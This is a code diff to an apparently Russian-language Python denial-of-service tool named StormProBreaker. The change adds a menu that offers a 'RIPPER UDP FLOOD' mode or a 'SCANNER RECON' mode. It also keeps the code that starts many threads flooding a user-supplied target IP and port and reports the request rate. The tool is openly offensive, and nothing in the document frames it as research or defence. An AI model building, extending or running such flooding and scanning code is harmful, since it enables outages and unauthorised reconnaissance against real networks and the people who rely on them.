@@ -4,6 +4,7 @@ import threading
 import time
 from modules.config import *
 from modules.ui import banner
+from modules.scanner import run_scan
 
 class StormProBreaker:
     def __init__(self, profile='2'):
@@ -29,12 +30,21 @@ class StormProBreaker:
 
     def run(self):
         banner()
+        print(f" {G}[1]{RE} RIPPER UDP FLOOD")
+        print(f" {G}[2]{RE} SCANNER RECON")
+        
+        mode = input(f"\n{G}[?]{RE} Выберите режим > ")
+
+        if mode == '2':
+            target = input(f"\n{G}[?]{RE} IP для сканирования: ").strip()
+            run_scan(target)
+            input(f"\n{Y}[!] Нажмите Enter, чтобы выйти...{RE}")
+            return
+
         target = input(f"\n{G}[?]{RE} IP Цели: ").strip()
-        port = int(input(f"{G}[?]{RE} Порт: ") or 80)
+        port = int(input(f" {G}[?]{RE} Порт (80): ") or 80)
         
-        print(f"\n{BG_R}  RIPPER MODE ACTIVATED  {RE}")
-        
-        # Запускаем потоки как в оригинальном Рипере
+        print(f"\n{G}[*]{RE} Запуск потоков...")
         threads = []
         for _ in range(self.profile['concurrent']):
             t = threading.Thread(target=self.ripper_flood, args=(target, port))
@@ -47,7 +57,7 @@ class StormProBreaker:
             while True:
                 elapsed = time.time() - start_time
                 rps = self.stats['total'] / max(1, elapsed)
-                print(f"\r{B}┃{RE} {BOLD}RIPPER RPS:{RE} {Y}{rps:.0f}{RE} | {BOLD}Sent:{RE} {W}{self.stats['total']}{RE}", end="")
+                print(f"\r{B}|{RE} {BOLD}RIPPER RPS:{RE} {Y}{rps:.0f}{RE} ", end="")
                 time.sleep(1)
         except KeyboardInterrupt:
             self.is_running = False
